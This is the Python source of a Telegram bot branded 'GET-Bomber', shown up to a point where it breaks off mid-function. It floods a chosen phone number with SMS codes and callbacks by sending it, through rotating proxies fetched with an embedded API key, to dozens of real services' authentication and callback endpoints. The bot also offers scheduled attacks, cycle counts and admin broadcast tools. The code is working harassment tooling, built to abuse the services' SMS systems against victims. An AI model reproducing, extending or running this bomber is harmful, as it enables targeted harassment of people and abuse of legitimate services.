# -*- coding: utf-8 -*-

import datetime
import sqlite3
import string
import threading
from random import randint, random

import requests
import telebot

import config
import functions as func
import keyboard as menu
import message as mes

active_bomber = {}
test_bomber = {}


def mask(str, maska):
    if len(str) == maska.count('#'):
        str_list = list(str)
        for i in str_list:
            maska = maska.replace("#", i, 1)
        return maska
    #res = requests.get(
    #    'https://proxoid.net/api/getProxy?key=cc4990954eadb95dafca62694ca3a6c7&countries=all&types=https&level=all&speed=0&count=0',
    #    headers={'UA': 'Chrome'}).text.split("\n")

def start_bot():
	bot = telebot.TeleBot(config.bot_token, threaded=True, num_threads=300)

	@bot.message_handler(commands=['start'])
	def handler_start(message):
		chat_id = message.from_user.id
		if func.check_user_in_bd(chat_id) == 0:
			resp = func.first_join(user_id=chat_id, username=message.from_user.username)
			with open('photo/welcome.jpg', 'rb') as photo:
				bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=f'Добро пожаловать <a href="tg://user?id={message.from_user.id}">{message.chat.first_name}</a>,\n\n'
                            f'<b>Я GET-Bomber!</b>\n'
                            f'<b>Cо мной ты сможешь послать спам на номера России, Украины, Беларуси, Казахстана и Польши!</b>\n',
                    parse_mode='HTML',
                    reply_markup=menu.main_menu())
				bot.send_message(
                    chat_id=config.admin_group,
                    text=f'В @{config.bot_name} появился новый пользователь <a href="tg://user?id={message.from_user.id}">{message.chat.first_name}</a>',
                    parse_mode='HTML')
		else:
			with open('photo/welcome.jpg', 'rb') as photo:
				bot.send_photo(
                        chat_id=chat_id,
                        photo=photo,
                        caption=f'<a href="tg://user?id={message.from_user.id}">{message.chat.first_name}</a>, рад видеть тебя снова.\n\n',
                        parse_mode='HTML',
                        reply_markup=menu.main_menu())


#	@bot.message_handler(commands=['admin'])
#	def handler_admin(message):
 #       if str(message.from_user.id) in str(config.admin_id):
#		    bot.send_message(message.from_user.id, 'Вы перешли в меню админа', reply_markup=menu.admin_menu())
    @bot.message_handler(content_types=['text'])
    def send_message(message):
        chat_id = message.from_user.id
        first_name = message.from_user.first_name
        username = message.from_user.username
        ban = 1
        user = func.profile(chat_id)
        if str(user[4]) in str(ban):
            pass
        else:
            if message.text == 'Меню':
                with open('photo/welcome.jpg', 'rb') as photo:
                    bot.send_message(chat_id=chat_id, text='Вы вернулись в меню', reply_markup=menu.main_menu())
                    bot.send_photo(
                        chat_id=chat_id,
                        photo=photo,
                        caption=f'<b>Выбранная страна:</b>  {func.check_country(func.profile(chat_id)[3])}\n',
                        parse_mode='HTML',
                        reply_markup=menu.menu())
            else:
                buttons = func.get_reklama_button()
                for button in buttons:
                    if message.text == button[1]:
                        if button[3] is None:
                            return bot.send_message(chat_id=chat_id, text=button[2], reply_markup=menu.delete_message(),
                                                    parse_mode='HTML')
                        return bot.send_photo(chat_id=chat_id, photo=button[3], caption=button[2],
                                              reply_markup=menu.delete_message(), parse_mode='HTML')

    @bot.callback_query_handler(func=lambda call: True)
    def handler_call(call):
        chat_id = call.message.chat.id
        username = call.message.chat.username
        message_id = call.message.message_id
        ban = 1
        user = func.profile(chat_id)

        if str(user[4]) in str(ban):
            pass
        else:
            if call.data == 'informations':
                bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=f'<b>Информация:</b>\n\n'
                            f'<b>🗓 Работаем дней: {func.days_Stat()}</b>\n\n'
                            f'<b> Пользователи:</b>\n'
                            f'<b>▫️ Всего: {func.users_stat()}</b>\n\n',
                    parse_mode='HTML',
                    reply_markup=menu.info_markup())

            if call.data == 'exit_to_menu':
                with open('photo/welcome.jpg', 'rb') as photo:
                    bot.edit_message_caption(
                        chat_id=chat_id,
                        message_id=message_id,
                        caption=f'<b>Выбранная страна:</b>  {func.check_country(func.profile(chat_id)[3])}\n',
                        parse_mode='HTML',
                        reply_markup=menu.menu())

            if call.data == 'country':
                bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption='<b>Выберите страну бомбежки:</b>',
                    parse_mode='HTML',
                    reply_markup=menu.country_markup())

            if call.data == 'active_bomb':
                if str(chat_id) not in active_bomber:
                    bot.edit_message_caption(
                        chat_id=chat_id,
                        message_id=message_id,
                        caption='<b>На данный момент нет активных бомбежек</b>',
                        parse_mode='HTML',
                        reply_markup=menu.exit_menu())
                else:
                    text_msg = f''
                    for kk in active_bomber[str(chat_id)]:
                        cycle = active_bomber[str(chat_id)][kk]['cycle']
                        text_msg += f'\n{kk} / Осталось циклов: {cycle}'
                    if text_msg == '':
                        bot.edit_message_caption(
                            chat_id=chat_id,
                            message_id=message_id,
                            caption='<b>На данный момент нет активных бомбежек</b>',
                            parse_mode='HTML',
                            reply_markup=menu.exit_menu())
                    else:
                        bot.edit_message_caption(
                            chat_id=chat_id,
                            message_id=message_id,
                            caption='<b>Активные бомбежки:</b>' + text_msg,
                            parse_mode='HTML',
                            reply_markup=menu.exit_menu())

            if call.data[:4] == 'par_':
                country = call.data[4:]
                func.func_add(chat_id, country)
                bot.delete_message(
                    chat_id=chat_id,
                    message_id=message_id)
                with open('photo/welcome.jpg', 'rb') as photo:
                    bot.send_photo(
                        chat_id=chat_id,
                        photo=photo,
                        caption=f'<b>Выбранная страна:</b>  {func.check_country(func.profile(chat_id)[3])}\n',
                        parse_mode='HTML',
                        reply_markup=menu.menu())

            if call.data == 'profile':
                bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=mes.profile.format(
                        id=chat_id,
                        name=call.message.chat.first_name,
                        kol_bomb=func.profile(chat_id)[5],
                        country=func.check_country(func.profile(chat_id)[3])),
                    parse_mode='HTML',
                    reply_markup=menu.profile_markup())

            if call.data == 'bomb_started':
                countries = func.profile(chat_id)[3]
                bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=f'<b>Выбранная страна:</b>  {func.check_country(func.profile(chat_id)[3])}\n',
                    parse_mode='HTML',
                    reply_markup=menu.run_bomb())

            if call.data == 'run_now_':

                if str(chat_id) in active_bomber:
                    el = 0
                    for fgdf in active_bomber[str(chat_id)]:
                        el += 1
                        if el == 3:
                            return bot.send_message(chat_id=chat_id,
                                                    text='😱 Вы уже достигли максимального количества бомбежек, подождите пока они закончат свои циклы')

                msg = bot.send_message(
                    chat_id=chat_id,
                    text=f'⛑ Введите номер на который необходимо активировать бомбер (с +)')
                bot.register_next_step_handler(msg, get_number_by_user)

            if call.data == 'white_list':
                msg = bot.send_message(
                    chat_id=chat_id,
                    text='Введите номер (с +)')
                bot.register_next_step_handler(msg, add_white_list)

            if call.data == 'add_reklam_button':
                msg = bot.send_message(
                    chat_id=chat_id,
                    text='Введите текст кнопки')
                bot.register_next_step_handler(msg, add_reklam_button_1)

            if call.data == 'delete_reklam_button':
                bot.send_message(
                    chat_id=chat_id,
                    text='Выберите какую кнопку удалить',
                    reply_markup=menu.how_to_delete())
            if call.data.startswith('del_button='):
                knopka = call.data.replace('del_button=', '')
                func.delete_button(knopka)
                bot.send_message(
                    chat_id=chat_id,
                    text='удалил'
                )
            if call.data == 'delete_message':
                bot.delete_message(chat_id=chat_id, message_id=message_id)
            if call.data == 'edit_reklam_text':
                msg = bot.send_message(chat_id=chat_id, text='введите рекламный текст')
                bot.register_next_step_handler(msg, edit_reklam_text)
            if call.data == 'view_bombesh':
                msg = ''
                ids1 = 0
                for id1 in active_bomber:
                    for id2 in active_bomber[id1]:
                        msg += f"\n{id1} | {id2} , циклов: {active_bomber[id1][id2]['cycle']}"
                        ids1 += 1
                bot.send_message(chat_id=chat_id, text=f'всего бомбежек: {ids1}{msg}')
            if call.data == 'off_bombesh':
                msg = bot.send_message(chat_id=chat_id,
                                       text='введите айди человека, которому необходимо выключить бомбежку')
                bot.register_next_step_handler(msg, off_bombesh)
            if call.data == 'rassilka':
                msg = bot.send_message(chat_id=chat_id,
                                       text='введите текст для рассылки')
                bot.register_next_step_handler(msg, rassilka)
            if call.data == 'run_otlos_':
                if str(chat_id) in active_bomber:
                    el = 0
                    for fgdf in active_bomber[str(chat_id)]:
                        el += 1
                        if el == 3:
                            return bot.send_message(chat_id=chat_id,
                                                    text='😱 Вы уже достигли максимального количества бомбежек, подождите пока они закончат свои циклы')
                msg = bot.send_message(chat_id=chat_id,
                                       text='🤖 Введите дату (формат: "31.10.2020 15:00" или "16:00")')
                bot.register_next_step_handler(msg, run_otlos_)
            if call.data == 'find_user':
                msg = bot.send_message(chat_id=chat_id,
                                       text='введите айди юзера (например: 954246335 или @keyfqsZ)')
                bot.register_next_step_handler(msg, find_user)
            if call.data.startswith('block_user_'):
                user_id = call.data.replace('block_user_', '')
                conn = sqlite3.connect("base.db")
                cursor = conn.cursor()
                cursor.execute("UPDATE users SET ban = ? WHERE user_id = ?", (1, int(user_id)))
                conn.commit()
                conn.close()
                bot.send_message(chat_id=chat_id, text='ok')
            if call.data.startswith('unblock_user_'):
                user_id = call.data.replace('unblock_user_', '')
                conn = sqlite3.connect("base.db")
                cursor = conn.cursor()
                cursor.execute("UPDATE users SET ban = ? WHERE user_id = ?", (0, int(user_id)))
                conn.commit()
                conn.close()
                bot.send_message(chat_id=chat_id, text='ok')

    def find_user(message):
        n = message.text
        chat_id = message.from_user.id
        if not n.isdigit():
            n = n.replace('@', '')
            user = func.profile_by_username(n)
            print(user)
            if user is None:
                return bot.send_message(chat_id=chat_id, text='данный айди не найден в списке игроков')
            if str(chat_id) not in active_bomber:
                return bot.send_message(chat_id=chat_id,
                                        text=f'{user[0]} | {user[1]} | ban: {user[4]}\n<b>На данный момент нет активных бомбежек у юзера</b>',
                                        parse_mode='HTML',
                                        reply_markup=menu.block_menu(user[0]))
            else:
                text_msg = f''
                for kk in active_bomber[str(chat_id)]:
                    cycle = active_bomber[str(chat_id)][kk]['cycle']
                    text_msg += f'\n{kk} / Осталось циклов: {cycle}'
                if text_msg == '':
                    return bot.send_message(chat_id=chat_id,
                                            text=f'{user[0]} | {user[1]} | ban: {user[4]}\n<b>На данный момент нет активных бомбежек у юзера</b>',
                                            parse_mode='HTML',
                                            reply_markup=menu.block_menu(user[0]))
                else:
                    bot.send_message(
                        chat_id=chat_id,
                        text=f'{user[0]} | {user[1]} | ban: {user[4]}{text_msg}',
                        parse_mode='HTML',
                        reply_markup=menu.block_menu(user[0]))
        else:
            try:
                user = func.profile(int(n))
                if user is None == 0:
                    return bot.send_message(chat_id=chat_id, text='данный айди не найден в списке игроков')
                if str(chat_id) not in active_bomber:
                    return bot.send_message(chat_id=chat_id,
                                            text=f'{user[0]} | {user[1]} | ban: {user[4]}\n<b>На данный момент нет активных бомбежек у юзера</b>',
                                            parse_mode='HTML',
                                            reply_markup=menu.block_menu(user[0]))
                else:
                    text_msg = f''
                    for kk in active_bomber[str(chat_id)]:
                        cycle = active_bomber[str(chat_id)][kk]['cycle']
                        text_msg += f'\n{kk} / Осталось циклов: {cycle}'
                    if text_msg == '':
                        return bot.send_message(chat_id=chat_id,
                                                text=f'{user[0]} | {user[1]} | ban: {user[4]}\n<b>На данный момент нет активных бомбежек у юзера</b>',
                                                parse_mode='HTML',
                                                reply_markup=menu.block_menu(user[0]))
                    else:
                        bot.send_message(
                            chat_id=chat_id,
                            text=f'{user[0]} | {user[1]} | ban: {user[4]}{text_msg}',
                            parse_mode='HTML',
                            reply_markup=menu.block_menu(user[0]))
            except:
                bot.send_message(chat_id=chat_id, text='вы ввели некорректный айди игрока')

    def run_otlos_(message):
        n = message.text
        chat_id = message.from_user.id
        n_format = n.split(' ')
        date1 = 0
        now = datetime.datetime.now()
        print(n_format)
        try:
            if len(n_format) == 1:
                n1_format = n_format[0].split(':')
                print(n1_format)
                if len(n1_format) != 2 or not n1_format[0].isdigit() or not n1_format[1].isdigit():
                    return bot.send_message(chat_id=chat_id, text='👣 Вы ввели некорректную дату')
                date1 = datetime.datetime.combine(datetime.date(now.year, now.month, now.day),
                                                  datetime.time(int(n1_format[0]), int(n1_format[1])))
                if str(chat_id) not in test_bomber:
                    test_bomber[str(chat_id)] = {}
                test_bomber[str(chat_id)]['2'] = str(date1.timestamp())
                msg = bot.send_message(
                    chat_id=chat_id,
                    text=f'⛑ Введите номер на который необходимо активировать бомбер (с +)')
                bot.register_next_step_handler(msg, run_otlos_faza_2)
            elif len(n_format) == 2:
                n2_format = n_format[0].split('.')
                if len(n2_format) != 3 or not n2_format[0].isdigit() or not n2_format[1].isdigit() or not n2_format[
                    2].isdigit():
                    return bot.send_message(chat_id=chat_id, text='👣 Вы ввели некорректную дату')

                n1_format = n_format[1].split(':')
                if len(n1_format) != 2 or not n1_format[0].isdigit() or not n1_format[1].isdigit():
                    return bot.send_message(chat_id=chat_id, text='👣 Вы ввели некорректную дату')
                print(n2_format)
                print(n1_format)
                date1 = datetime.datetime.combine(
                    datetime.date(int(n2_format[2]), int(n2_format[1]), int(n2_format[0])),
                    datetime.time(int(n1_format[0]), int(n1_format[1])))
                if str(chat_id) not in test_bomber:
                    test_bomber[str(chat_id)] = {}
                test_bomber[str(chat_id)]['2'] = str(date1.timestamp())
                msg = bot.send_message(
                    chat_id=chat_id,
                    text=f'⛑ Введите номер на который необходимо активировать бомбер (с +)')
                bot.register_next_step_handler(msg, run_otlos_faza_2)
            else:
                bot.send_message(chat_id=chat_id, text='👣 Вы ввели некорректную дату')
        except ValueError:
            print('ok')
            bot.send_message(chat_id=chat_id, text='👣 Вы ввели некорректную дату')

    def run_otlos_faza_2(message):
        n = message.text
        chat_id = message.from_user.id

        def only_numerics(p):
            seq_type = type(p)
            return seq_type().join(filter(seq_type.isdigit, p))

        p = only_numerics(n)

        if "0000000000" < p < "9999999999" and len(p) < 15:
            if str(chat_id) not in test_bomber:
                test_bomber[str(chat_id)] = {}
            test_bomber[str(chat_id)]['0'] = n
            msg = bot.send_message(chat_id=chat_id,
                                   text=f'🧨 Введите количество выполняемых циклов')
            bot.register_next_step_handler(msg, start_bomb)
        else:
            bot.send_message(chat_id=chat_id,
                             text=f'☝🏻 Вы ввели некорректный номер, повторите попытку')

    def rassilka(message):
        n = message.text
        chat_id = message.from_user.id
        if n is None:
            n = message.caption
            if message.photo is not None:
                file_info = bot.get_file(message.photo[1].file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                photo_id = downloaded_file
        conn = sqlite3.connect('base.db')
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users")
        data = cursor.fetchall()
        cursor.close()
        if message.animation is not None:
            file_info = bot.get_file(message.animation.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            for user in data:
                bot.send_video(chat_id=user[0], data=downloaded_file, caption=n, reply_markup=menu.delete_message(),
                               parse_mode='HTML')
            bot.send_message(chat_id=chat_id, text='завершена', parse_mode='HTML')
        elif message.photo is not None:
            file_info = bot.get_file(message.photo[1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            for user in data:
                bot.send_photo(chat_id=user[0], caption=n, photo=downloaded_file, reply_markup=menu.delete_message(),
                               parse_mode='HTML')
            bot.send_message(chat_id=chat_id, text='завершена', parse_mode='HTML')
        else:
            for user in data:
                bot.send_message(chat_id=user[0], text=n, reply_markup=menu.delete_message(), parse_mode='HTML')
            bot.send_message(chat_id=chat_id, text='завершена', parse_mode='HTML')

    def off_bombesh(message):
        n = message.text
        chat_id = message.from_user.id
        if not n.isdigit():
            return bot.send_message(chat_id=chat_id, text='Вы ввели некорректный айди человека')
        for id1 in active_bomber:
            if str(id1) == str(n):
                del active_bomber[id1]
                return bot.send_message(chat_id=chat_id, text='успешно выключили')
        bot.send_message(chat_id=chat_id, text='не найден человек')

    def edit_reklam_text(message):
        n = message.text
        photo_id = None
        chat_id = message.from_user.id
        if n is None:
            n = message.caption
            if message.photo is not None:
                file_info = bot.get_file(message.photo[1].file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                photo_id = downloaded_file
        conn = sqlite3.connect('base.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE `context` SET `value` = ?, `value2` = ? WHERE `context`.`id` = \"1\"", (n, photo_id))
        conn.commit()
        bot.send_message(chat_id=chat_id, text='Успешно')

    def add_reklam_button_1(message):
        n = message.text
        chat_id = message.from_user.id
        if str(chat_id) not in test_bomber:
            test_bomber[str(chat_id)] = {}
        test_bomber[str(chat_id)]['1`'] = n
        msg = bot.send_message(chat_id=chat_id, text='Введите содержимое рекламы')
        bot.register_next_step_handler(msg, add_reklam_button_2)

    def add_reklam_button_2(message):
        n = message.text
        photo_id = None
        if n is None:
            n = message.caption
            if message.photo is not None:
                file_info = bot.get_file(message.photo[1].file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                photo_id = downloaded_file
        chat_id = message.from_user.id
        conn = sqlite3.connect('base.db')
        cursor = conn.cursor()
        users = [None, test_bomber[str(chat_id)]['1`'], n, photo_id]
        cursor.execute(f'INSERT INTO button_reklama VALUES (?,?,?,?)', users)
        conn.commit()
        bot.send_message(chat_id=chat_id, text='Успешно')

    def get_number_by_user(message):
        n = message.text
        chat_id = message.from_user.id
        now = datetime.datetime.now()
        date1 = datetime.datetime.combine(datetime.date(int(now.year), int(now.month), int(now.day)),
                                          datetime.time(int(now.hour), int(now.minute)))
        if str(chat_id) not in test_bomber:
            test_bomber[str(chat_id)] = {}
        test_bomber[str(chat_id)]['2'] = date1.timestamp()

        def only_numerics(p):
            seq_type = type(p)
            return seq_type().join(filter(seq_type.isdigit, p))

        p = only_numerics(n)

        if "0000000000" < p < "9999999999" and len(p) < 15:
            if str(chat_id) not in test_bomber:
                test_bomber[str(chat_id)] = {}
            test_bomber[str(chat_id)]['0'] = n
            msg = bot.send_message(chat_id=chat_id,
                                   text=f'Введите количество выполняемых циклов')
            bot.register_next_step_handler(msg, start_bomb)
        else:
            bot.send_message(chat_id=chat_id,
                             text=f'☝🏻 Вы ввели некорректный номер, повторите попытку')

    def start_bomb(message):
        n = message.text
        chat_id = message.from_user.id
        phone = test_bomber[str(chat_id)]['0']
        unixtime = test_bomber[str(chat_id)]['2']
        if not n.isdigit():
            return bot.send_message(chat_id=chat_id,
                                    text=f'Вы ввели некорректное число циклов, повторите попытку')
        if str(chat_id) not in active_bomber:
            active_bomber[str(chat_id)] = {}
        active_bomber[str(chat_id)][phone] = {'cycle': int(n), 'unixtime': int(round(float(unixtime)))}
        bot.send_message(chat_id=chat_id, text=f'Бомбежка на номер: "{phone}" успешно поставлена')
        send_reklam_text(chat_id)

    def add_white_list(message):
        n = message.text
        if n[:1] == '7' and len(n) == 11 or n[:3] == '380' and len(n[3:]) == 9 or n[:3] == '375' and len(n) <= 12 or n[
                                                                                                                     :2] and len(
            n) <= 11:
            if n.isdigit():
                func.add_white_list(message.from_user.id, message.text)
                bot.send_message(
                    chat_id=message.from_user.id,
                    text=f'Номер {message.text} добавлен в белый список!')
            else:
                bot.send_message(
                    chat_id=message.from_user.id,
                    text='Номер введен неправильно!')

    def transformPhone(phone, i):
        if i == 5:
            return '+' + phone[0] + ' (' + phone[1:4] + ') ' + phone[4:7] + ' ' + phone[7:9] + ' ' + phone[9:11]

    def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))

    def update_proxy():
        global res
        res = requests.get(
            'https://proxoid.net/api/getProxy?key=cc4990954eadb95dafca62694ca3a6c7&countries=all&types=https&level=all&speed=0&count=0',
            headers={'UA': 'Chrome'}).text.split("\n")

    def thread_send_msg(phone):
        try:
            proxies1 = res[randint(0, len(res) - 1)]
            proxies = {
                'http': proxies1,
                'https': proxies1
            }
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                name = id_generator()
                phone9 = phone[1:]
                email = id_generator() + '@mail.ru'
            except:
                pass
            try:
                requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone[1:], maska="8(###)###-##-##")
                requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",
                              data={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://yaponchik.net/login/login.php",
                              data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/",
                                    "phone": phonee, "code": ""}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://eda.yandex/api/v1/user/request_authentication_code",
                              json={"phone_number": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://ng-api.webbankir.com/user/v2/create",
                              json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович",
                                    "mobilePhone": phone, "email": email, "smsCode": ""}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://b.utair.ru/api/v1/profile/", json={"phone": phone, "confirmationGDPRDate": int(
                    str(datetime.datetime.now().timestamp()).split('.')[0])}, proxies=proxies, timeout=10)
                requests.post("https://b.utair.ru/api/v1/login/",
                              json={"login": phone, "confirmation_type": "call_code"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                # под сомнением
                phonee = mask(str=phone, maska="#(###)###-##-##")
                requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action": "auth", "phone": phonee},
                              proxies=proxies, timeout=10)

                phonee = mask(str=phone, maska="+#(###)###-##-##")
                requests.post("https://www.r-ulybka.ru/login/form_ajax.php",
                              data={"phone": "+7(915)350-99-08", "action": "sendSmsAgain"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://uklon.com.ua/api/v1/account/code/send",
                              headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",
                              headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth", json={"doc": {
                    "auth": {"mphone": "+" + phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0",
                             "source": "site", "signature": "undefined", }}}, headers={"Accept": "application/json"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://www.top-shop.ru/login/loginByPhone/", data={"phone": phonee}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="8(###)###-##-##")
                requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code", data={"phone": phonee},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                              data={"phone_number": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://m.tiktok.com/node-a/send/download_link",
                              json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone9,
                                    "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://msk.tele2.ru/api/validation/number/" + phone, json={"sender": "Tele2"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(phone, maska="+# (###) ### - ## - ##")
                requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",
                              data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",
                              data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="(+#)##########")
                requests.post("https://www.tanuki.ru/api/", json={
                    "header": {"version": "2.0", "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
                               "agent": {"device": "desktop", "version": "undefined undefined"}, "langId": "1",
                               "cityId": "9", }, "method": {"name": "sendSmsCode"},
                    "data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://tabasko.su/",
                              data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone9, "name": name},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="8(###)###-##-##")
                requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",
                              data={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="8 (###) ###-##-##")
                requests.post("http://sushigourmet.ru/auth", data={"phone": phonee, "stage": 1}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone},
                             proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="8-###-###-##-##")
                requests.post("https://pizzasushiwok.ru/index.php",
                              data={"mod_name": "registration", "tpl": "restore_password", "phone": phonee},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://www.sportmaster.ua/",
                             params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee},
                             proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
                              data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://smart.space/api/users/request_confirmation_code/",
                              json={"mobile": "+" + phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" + phone, "resend": 0},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://shafa.ua/api/v3/graphiql",
                              json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+" + phone},
                                    "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://shafa.ua/api/v3/graphiql",
                              json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+" + phone},
                                    "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",
                              data={"data": {"login": phone9, "check": True, "crypto": {"captcha": "739699"}}},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://rieltor.ua/api/users/register-sms/", json={"phone": phone, "retry": 0},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
                              data={"phone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+#(###)###-##-##")
                requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
                              data={"phone": phonee, "alien": "0"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code", params={"number": phone},
                             proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
